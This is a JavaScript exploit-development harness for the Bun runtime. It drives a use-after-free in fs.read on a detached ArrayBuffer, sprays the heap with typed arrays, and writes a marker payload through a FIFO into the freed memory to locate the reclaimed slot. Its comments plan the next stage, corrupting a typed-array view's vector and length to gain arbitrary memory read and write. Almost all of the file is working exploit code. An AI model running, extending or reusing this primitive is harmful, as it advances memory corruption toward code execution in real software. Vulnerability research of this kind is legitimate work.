// Path-2 real-cell vector corruption probe.
//
// Goal: avoid the structureID RELEASE_ASSERT by NOT constructing a fake
// JSCell. Instead, use the controlled-write primitive to land bytes at
// offset 144 of the freed BufferSource backing store, with a spray that
// reclaims into typed-array storage so we can either:
//
//   (a) place a known marker double inside a typed array we can reach by
//       JS and confirm the value transfer (positive control), or
//   (b) corrupt the m_vector / m_length of a real typed-array view we
//       still hold, and JS-visibly read or write through that
//       corrupted view to a chosen marker buffer.
//
// This harness only attempts (a) on this iteration: it sprays a mix of
// Uint8Array views and BigUint64Array views, runs the standard
// detach-then-spray-then-write cycle, and reports which view (if any)
// observes the planted bits at any of the first elements. That tells us
// whether the freed BufferSource slot reclaimed into a typed-array view
// cell or a typed-array data buffer, and at what offset within it the
// planted bits land. The output is a single JSON line per run; sweep
// SPRAY_KIND / VIEW_SIZE / BUF_SIZE / WRITE_OFFSET externally.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 8);
const bufSize = Number(process.env.BUF_SIZE || 8192);
const writeOffset = Number(process.env.WRITE_OFFSET || 144);
const writeLength = Number(process.env.WRITE_LENGTH || 8);
const viewSize = Number(process.env.VIEW_SIZE || 1024);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const sprayKind = process.env.SPRAY_KIND || "uint8Array";
const magicHex = process.env.MAGIC_HEX || "0xcafef00ddeadbeef";
const magic = BigInt(magicHex);
const path = join(tmpdir(), `bun-uaf-rcvc-${process.pid}`);
const retained = [];

const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mk.status !== 0) throw new Error(`mkfifo: ${mk.status}`);
const fd = fs.openSync(path, fs.constants.O_RDWR);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function makePayload() {
  // pack `magic` LE into writeLength bytes, padded with 0xCC
  const out = Buffer.alloc(writeLength, 0xcc);
  let v = magic;
  for (let i = 0; i < Math.min(8, writeLength); i++) {
    out[i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}

function allocateSpray() {
  const out = [];
  switch (sprayKind) {
    case "uint8Array": {
      for (let i = 0; i < sprayCount; i++) {
        const u = new Uint8Array(viewSize);
        u.fill((i & 0xff) ^ 0x55);
        out.push(u);
      }
      return out;
    }
    case "biguint64Array": {
      const slots = viewSize / 8;
      for (let i = 0; i < sprayCount; i++) {
        const u = new BigUint64Array(slots);
        for (let j = 0; j < Math.min(slots, 4); j++) u[j] = BigInt(i) ^ 0xa5a5n;
        out.push(u);
      }
      return out;
    }
    case "float64Array": {
      const slots = viewSize / 8;
      for (let i = 0; i < sprayCount; i++) {
        const u = new Float64Array(slots);
        for (let j = 0; j < Math.min(slots, 4); j++) u[j] = i + j / 1024;
        out.push(u);
      }
      return out;
    }
    case "arrayBuffer": {
      for (let i = 0; i < sprayCount; i++) {
        const ab = new ArrayBuffer(viewSize);
        const u = new Uint8Array(ab);
        u[0] = i & 0xff;
        out.push({ ab, u });
      }
      return out;
    }
    default:
      throw new Error(`unknown SPRAY_KIND ${JSON.stringify(sprayKind)}`);
  }
}

function findMagic(spray) {
  for (let i = 0; i < spray.length; i++) {
    const v = spray[i];
    let arr;
    if (sprayKind === "arrayBuffer") {
      arr = new BigUint64Array(v.ab);
    } else if (v instanceof Uint8Array) {
      arr = new BigUint64Array(v.buffer, v.byteOffset, v.byteLength / 8 | 0);
    } else if (v instanceof BigUint64Array) {
      arr = v;
    } else if (v instanceof Float64Array) {
      arr = new BigUint64Array(v.buffer, v.byteOffset, v.length);
    } else continue;

    for (let j = 0; j < Math.min(arr.length, 32); j++) {
      if (arr[j] === magic) {
        return { sprayIndex: i, slotIndex: j, kind: sprayKind };
      }
    }
  }
  return null;
}

async function runOne(iteration) {
  const ab = new ArrayBuffer(bufSize);
  const view = new Uint8Array(ab);
  view.fill(0x51);

  const done = new Promise((resolve) => {
    fs.read(fd, view, writeOffset, writeLength, null, (err, bytesRead) => resolve({ err, bytesRead }));
  });

  detach(ab);
  gcNow();
  retained.length = 0;
  retained.push(...allocateSpray());
  gcNow();

  fs.writeSync(fd, makePayload(), 0, writeLength);
  await done;
  return findMagic(retained);
}

let foundOnIteration = null;
let foundLocation = null;
try {
  for (let i = 1; i <= iterations; i++) {
    const found = await runOne(i);
    if (found) {
      foundOnIteration = i;
      foundLocation = found;
      break;
    }
  }
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}

console.log(JSON.stringify({
  bufSize, writeOffset, writeLength, viewSize, sprayCount, sprayKind,
  magicHex,
  iterations,
  foundOnIteration,
  foundLocation,
}));
process.exitCode = foundLocation ? 86 : 1;
